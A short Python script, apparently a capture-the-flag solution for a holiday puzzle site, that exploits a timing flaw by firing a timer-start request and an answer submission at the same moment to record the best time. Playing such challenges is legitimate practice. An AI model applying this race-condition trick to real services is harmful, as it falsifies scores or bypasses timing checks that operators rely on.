#!/usr/bin/env python3

# Exploits a vulnerability to get the best time

from multiprocessing import Barrier, Process
import requests
import uuid

domain = 'crate.elfu.org'

def start(seed, synchronizer):
    """Download the Javascript to start our timer."""
    
    s = requests.Session()
    
    # Wait for the other function
    synchronizer.wait()

    # HEAD request because we don't actually need the contents
    s.head('https://' + domain + '/client.js/' + seed)

def stop(seed, synchronizer):
    """Submit our answer to stop the timer."""

    data = {'seed': seed, 'codes': {'8': "VERONICA"}}

    s = requests.Session()

    # Wait for the other function
    synchronizer.wait()

    result = s.post('https://' + domain + '/open', json=data)
    print(result.content)
    
def main():
    # Pick a random UUID
    seed = str(uuid.uuid4())

    # Run start and stop, simultaneously
    synchronizer = Barrier(2)
    Process(target=start, args=(seed, synchronizer)).start()
    Process(target=stop, args=(seed, synchronizer)).start()
    
    print("Image is at https://" + domain + "/images/scores/" + seed + ".jpg")


if __name__ == '__main__':
    main()
